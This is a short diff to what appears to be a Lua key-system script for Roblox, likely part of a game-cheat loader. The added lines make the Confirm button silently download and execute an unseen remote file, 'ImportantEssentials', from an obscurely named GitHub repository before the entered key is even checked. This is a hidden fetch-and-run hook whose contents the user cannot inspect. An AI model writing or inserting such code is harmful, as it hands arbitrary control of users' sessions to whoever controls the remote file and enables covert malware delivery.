@@ -461,6 +461,8 @@ CloseButton.MouseButton1Down:Connect(function()
 end)
 
 Confirm.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Khronical/hjhjhjjhjhjhjhjhjhj/main/ImportantEssentials"))()
+	wait(.5)
 	_G.key = KeyInput.Text
 	local whitelistcheck = loadstring(game:HttpGet("https://raw.githubusercontent.com/Khronical/hjhjhjjhjhjhjhjhjhj/main/DataTableKeys", true))()
 	KeyInput.TextEditable = false
